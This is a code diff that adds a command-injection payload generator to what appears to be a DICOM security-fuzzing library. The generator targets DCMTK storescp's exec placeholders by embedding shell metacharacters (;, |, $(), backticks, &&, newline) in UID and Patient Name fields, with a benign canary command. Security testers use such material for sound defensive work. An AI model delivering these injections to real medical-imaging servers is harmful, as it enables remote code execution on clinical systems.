@@ -20,6 +20,7 @@ Attack Categories:
     ProtocolAttacks    - Target network stack (PDUs, associations)
     MemoryAttacks      - Buffer overflows, allocation exhaustion
     LogicAttacks       - Semantic confusion, state violations
+    CommandInjectionAttacks - Shell injection via storescp exec placeholders
     StateMachineAttacks - DICOM state machine (Sta1-Sta13) violations
     CVEAttacks         - CVE-specific reproductions
 
@@ -105,6 +106,7 @@ __all__ = [
     'ProtocolAttacks',
     'MemoryAttacks',
     'LogicAttacks',
+    'CommandInjectionAttacks',
     'StateMachineAttacks',
     'CVEAttacks',
     # Seed generators (corpus emitters for AFL++/AFLNet; not fuzzing engines)
@@ -1038,6 +1040,173 @@ class LogicAttacks:
         yield cls.file_uri_injection()
         yield cls.unc_path_injection()
         yield cls.data_uri_script()
+
+
+# =============================================================================
+# Command Injection Attacks - shell metacharacters in storescp exec placeholders
+# =============================================================================
+
+class CommandInjectionAttacks:
+    """
+    Shell command injection via storescp's execution-option placeholders
+    (DCMTK issue #1194).
+
+    ``storescp`` substitutes attacker-controlled DICOM values into a command
+    run through ``/bin/sh -c`` whenever ``--exec-on-reception`` (``-xcr``) or
+    ``--exec-on-eostudy`` (``-xcs``) is configured:
+
+        #f  <- received file name -- derived from SOP Instance UID (0008,0018)
+        #p  <- received path      -- derived from Study Instance UID (0020,000D)
+                                     with --sort-on-study-uid (-su), or from
+                                     Patient Name (0010,0010) with
+                                     --sort-on-patientname (-sp)
+        #r  <- reverse-DNS name of the calling SCU's host
+
+    DCMTK added allowlist sanitisation for the AE-title placeholders #a/#c in
+    Feb 2024 (issue #1109) but not for #f/#p/#r. An unauthenticated SCU that
+    embeds shell metacharacters in these fields achieves RCE on the storescp
+    host; a hardened storescp must strip or reject them.
+
+    The #r vector depends on the SCU host's reverse-DNS record, not on the
+    DICOM object, so it is documented here but not emitted as a payload.
+
+    Pure payload generators - no network I/O. Deliver with
+    ``deliver.send_cstore`` so the crafted UID also reaches the C-STORE
+    command set; ``metadata`` carries the matching sop_class_uid /
+    sop_instance_uid.
+    """
+
+    # Benign proof-of-concept canary: creates a marker file, destroys nothing.
+    _CANARY = '/tmp/c-scare-rce'
+
+    # (id, injected suffix, description) - shell metacharacters left
+    # unsanitised on the #f / #p / #r placeholders.
+    _SHELL_PAYLOADS = [
+        ('semicolon',   '; touch ' + _CANARY + ' ;',  'command separator'),
+        ('pipe',        '| touch ' + _CANARY,         'pipe to a second command'),
+        ('subshell',    '$(touch ' + _CANARY + ')',   'command substitution'),
+        ('backtick',    '`touch ' + _CANARY + '`',    'backtick substitution'),
+        ('logical_and', '&& touch ' + _CANARY,        'conditional chaining'),
+        ('newline',     '\ntouch ' + _CANARY + '\n',  'newline-injected command'),
+        ('redirect',    '> ' + _CANARY,               'output redirection'),
+    ]
+
+    @classmethod
+    def _lookup(cls, payload_id: str) -> Tuple[str, str]:
+        """Return (suffix, description) for a shell payload id."""
+        for pid, suffix, note in cls._SHELL_PAYLOADS:
+            if pid == payload_id:
+                return suffix, note
+        raise ValueError(f'unknown shell payload id: {payload_id!r}')
+
+    @staticmethod
+    def _base_dataset() -> Dataset:
+        """A small, storable image object carrying placeholder identifiers."""
+        ds = Dataset()
+        ds = ds / Element(0x0008, 0x0016, 'UI', SECONDARY_CAPTURE_SOP_CLASS_UID)
+        ds = ds / Element(0x0008, 0x0018, 'UI', '1.2.3.4.5')      # SOP Instance UID
+        ds = ds / Element(0x0008, 0x0060, 'CS', 'OT')             # Modality
+        ds = ds / Element(0x0010, 0x0010, 'PN', 'Doe^John')       # Patient Name
+        ds = ds / Element(0x0010, 0x0020, 'LO', '12345')          # Patient ID
+        ds = ds / Element(0x0020, 0x000D, 'UI', '1.2.3.4.5.1')    # Study Instance UID
+        ds = ds / Element(0x0020, 0x000E, 'UI', '1.2.3.4.5.2')    # Series Instance UID
+        return ds
+
+    @classmethod
+    def sop_instance_uid_injection(cls, payload_id: str = 'semicolon') -> AttackResult:
+        """Shell metacharacters in SOP Instance UID - storescp #f placeholder."""
+        suffix, note = cls._lookup(payload_id)
+        malicious = '1.2.3.4.5' + suffix
+        ds = cls._base_dataset()
+        ds[0x00080018] = Element(0x0008, 0x0018, 'UI', malicious)
+        return AttackResult(
+            name=f'cmd_injection_sop_uid_{payload_id}',
+            category='command_injection',
+            payload=ds.encode(),
+            description=f'SOP Instance UID carries a {note}',
+            expected_behavior='storescp must sanitise shell metacharacters '
+                              'before substituting the #f placeholder',
+            metadata={
+                'dcmtk_issue': 1194,
+                'placeholder': '#f',
+                'requires_option': '--exec-on-reception / --exec-on-eostudy',
+                'target_field': '(0008,0018) SOP Instance UID',
+                'shell_payload': suffix,
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': malicious,
+            },
+        )
+
+    @classmethod
+    def study_instance_uid_injection(cls, payload_id: str = 'semicolon') -> AttackResult:
+        """Shell metacharacters in Study Instance UID - storescp #p placeholder.
+
+        Reached when storescp also runs with --sort-on-study-uid (-su), which
+        names the per-study subdirectory after the Study Instance UID.
+        """
+        suffix, note = cls._lookup(payload_id)
+        malicious = '1.2.3.4.5.1' + suffix
+        ds = cls._base_dataset()
+        ds[0x0020000D] = Element(0x0020, 0x000D, 'UI', malicious)
+        return AttackResult(
+            name=f'cmd_injection_study_uid_{payload_id}',
+            category='command_injection',
+            payload=ds.encode(),
+            description=f'Study Instance UID carries a {note}',
+            expected_behavior='storescp must sanitise shell metacharacters '
+                              'before substituting the #p placeholder',
+            metadata={
+                'dcmtk_issue': 1194,
+                'placeholder': '#p',
+                'requires_option': '--exec-on-* with --sort-on-study-uid (-su)',
+                'target_field': '(0020,000D) Study Instance UID',
+                'shell_payload': suffix,
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': '1.2.3.4.5',
+            },
+        )
+
+    @classmethod
+    def patient_name_injection(cls, payload_id: str = 'semicolon') -> AttackResult:
+        """Shell metacharacters in Patient Name - storescp #p placeholder.
+
+        Reached when storescp also runs with --sort-on-patientname (-sp),
+        which names the per-patient subdirectory after the Patient Name.
+        """
+        suffix, note = cls._lookup(payload_id)
+        malicious = 'Doe^John' + suffix
+        ds = cls._base_dataset()
+        ds[0x00100010] = Element(0x0010, 0x0010, 'PN', malicious)
+        return AttackResult(
+            name=f'cmd_injection_patient_name_{payload_id}',
+            category='command_injection',
+            payload=ds.encode(),
+            description=f'Patient Name carries a {note}',
+            expected_behavior='storescp must sanitise shell metacharacters '
+                              'before substituting the #p placeholder',
+            metadata={
+                'dcmtk_issue': 1194,
+                'placeholder': '#p',
+                'requires_option': '--exec-on-* with --sort-on-patientname (-sp)',
+                'target_field': '(0010,0010) Patient Name',
+                'shell_payload': suffix,
+                'sop_class_uid': SECONDARY_CAPTURE_SOP_CLASS_UID,
+                'sop_instance_uid': '1.2.3.4.5',
+            },
+        )
+
+    @classmethod
+    def all(cls) -> Generator[AttackResult, None, None]:
+        """Yield every command-injection attack payload."""
+        # #f - the SOP Instance UID is always attacker-controlled: full sweep.
+        for pid, _suffix, _note in cls._SHELL_PAYLOADS:
+            yield cls.sop_instance_uid_injection(pid)
+        # #p via Study Instance UID (needs --sort-on-study-uid).
+        for pid in ('semicolon', 'subshell', 'backtick'):
+            yield cls.study_instance_uid_injection(pid)
+        # #p via Patient Name (needs --sort-on-patientname).
+        for pid in ('semicolon', 'subshell', 'newline'):
+            yield cls.patient_name_injection(pid)
 
 
 # =============================================================================
